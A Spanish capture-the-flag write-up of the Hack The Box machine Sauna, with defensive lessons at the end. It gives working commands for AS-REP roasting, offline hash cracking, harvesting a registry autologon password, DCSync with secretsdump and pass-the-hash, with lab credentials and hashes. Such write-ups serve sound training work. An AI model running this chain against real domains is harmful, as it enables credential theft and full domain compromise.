---
title: "HTB: Sauna · de AS-REP Roasting a DCSync partiendo de una web"
date: 2026-09-10
draft: false
tags: ["hackthebox", "active-directory", "windows", "escalada-privilegios", "asreproast", "dcsync"]
summary: "Una máquina Windows retirada de dificultad fácil donde toda la cadena nace de la web corporativa: los nombres de los empleados se convierten en usuarios, una cuenta tiene desactivada la preautenticación de Kerberos, y una contraseña de autologon guardada en el registro lleva a un DCSync y al compromiso total del dominio."
---

## Resumen

Sauna es una máquina Windows retirada de dificultad fácil de Hack The Box, y es un ejemplo limpio de cómo un ataque a Active Directory puede empezar solo con la web pública de una empresa. El camino es:

1. Los **nombres de empleados** sacados de la web corporativa se convierten en candidatos a usuario de dominio.
2. **AS-REP Roasting** encuentra una cuenta (`fsmith`) con la preautenticación de Kerberos desactivada, que nos da un hash crackeable sin credenciales.
3. Crackear ese hash da acceso por WinRM.
4. Una **contraseña de autologon guardada en texto plano en el registro** da una cuenta de servicio.
5. Esa cuenta de servicio tiene permisos de **DCSync**, que permiten volcar el hash del Administrator para un pass-the-hash y el compromiso total del dominio.

Objetivo: `10.129.60.189`, un Controlador de Dominio Windows Server del dominio `EGOTISTICAL-BANK.LOCAL`.

## Enumeración

Escaneo completo de TCP con scripts por defecto y detección de versiones:

```bash
nmap -sC -sV -p- -oN nmap-sauna.txt 10.129.60.189
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0  (título: Egotistical Bank)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL)
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp open  mc-nmf        .NET Message Framing
...
```

La combinación Kerberos/LDAP/SMB lo marca como Controlador de Dominio, y WinRM (5985) está abierto, así que unas credenciales válidas del usuario adecuado nos dan shell interactivo. A diferencia de una máquina que filtra su lista de usuarios por sesión nula anónima, aquí la superficie interesante es el **servidor web IIS en el puerto 80**. Una web corporativa casi siempre tiene una página de "about" o de "equipo", y esos nombres de empleados son la materia prima para los usuarios de dominio.

La página del equipo lista seis empleados:

```
Fergus Smith, Shaun Coins, Sophie Driver, Bowie Taylor, Hugo Bear, Steven Kerb
```

## Punto de entrada · AS-REP Roasting

No sabemos la convención de usuarios de la empresa, así que generamos los formatos comunes (`fsmith`, `fergus.smith`, `fergussmith`, `smithf`, ...) para cada empleado en un `users.txt`, y los probamos todos.

El ataque es **AS-REP Roasting**. Kerberos normalmente exige preautenticación (demostrar que sabes la contraseña antes de que el DC te dé nada). Si una cuenta lo tiene desactivado ("Do not require Kerberos preauthentication"), cualquiera puede pedir un ticket AS-REP cifrado con el hash de la contraseña de esa cuenta, sin ninguna credencial, y crackearlo offline. `GetNPUsers.py` prueba toda la lista y devuelve un hash de cualquier cuenta vulnerable:

```bash
impacket-GetNPUsers -no-pass -dc-ip 10.129.60.189 EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt
```

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:aed2d705...
```

Un acierto: **fsmith**, que además confirma que la convención es inicial del nombre + apellido. Lo crackeamos offline. El hash es AS-REP (modo 18200 de hashcat); como la VM de ataque no tiene GPU, John the Ripper en CPU hace el trabajo:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# fsmith ... Thestrokes23
```

La credencial es válida y fsmith está en el grupo Remote Management Users, así que hay WinRM:

```bash
netexec winrm 10.129.60.189 -u fsmith -p 'Thestrokes23'
# (Pwn3d!)

evil-winrm -i 10.129.60.189 -u fsmith -p 'Thestrokes23'
```

```
*Evil-WinRM* PS> type C:\Users\FSmith\Desktop\user.txt
352fd5ef************************a2
```

Flag de usuario capturada.

## Escalada de privilegios · autologon a DCSync

En un Controlador de Dominio, el objetivo son credenciales guardadas o privilegios de replicación. Un sitio clásico donde Windows deja una contraseña en texto plano es la **configuración de autologon del registro**: si la máquina está configurada para iniciar sesión automáticamente, guarda el usuario y la contraseña bajo `Winlogon`.

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

```
DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```

El `DefaultUserName` pone `svc_loanmanager`, pero la cuenta real del dominio se llama `svc_loanmgr`, un pequeño detalle que conviene comprobar en vez de darlo por hecho:

```bash
netexec smb 10.129.60.189 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
# [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr (válido)
```

Esta cuenta de servicio tiene el permiso `DS-Replication-Get-Changes-All`, el mismo que usan los controladores de dominio para sincronizarse entre sí. Con él podemos pedirle al DC que replique los hashes de todas las cuentas, incluida la de Administrator, sin ser admin. Esto es **DCSync**:

```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.60.189
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

(El `rpc_s_access_denied` del principio, en el método de registro remoto, es inofensivo; el método de replicación DRSUAPI es el que importa, y funciona.)

Con el hash NTLM del Administrator nos autenticamos por **pass-the-hash**, sin necesidad de contraseña:

```bash
evil-winrm -i 10.129.60.189 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

```
*Evil-WinRM* PS> type C:\Users\Administrator\Desktop\root.txt
9c1171ef************************c4
```

Flag de root capturada. Compromiso total del dominio.

## Lecciones

Sauna encadena errores que aparecen constantemente en auditorías reales:

- **Los nombres públicos de empleados son entrada para el atacante.** Una página de equipo es cómoda para los clientes e igual de cómoda para construir una lista de usuarios de dominio. No siempre se puede evitar, pero significa que todo lo que viene después (endurecimiento de Kerberos, política de contraseñas) tiene que aguantar.
- **La preautenticación de Kerberos nunca debería estar desactivada.** Cualquier cuenta que la tenga desactivada es un hash crackeable offline y sin autenticar, servido en bandeja. Audita el flag `DONT_REQUIRE_PREAUTH` en todo el dominio.
- **Nunca actives el autologon en un servidor**, y menos en un Controlador de Dominio. Guarda la contraseña en texto plano en una clave del registro que cualquier usuario autenticado puede leer.
- **Trata los permisos de DCSync como tier-0.** Los privilegios de replicación en una cuenta de servicio equivalen a Domain Admin. Audita quién tiene `DS-Replication-Get-Changes` y `-All`.

*Los flags están parcialmente ocultos, por convención.*
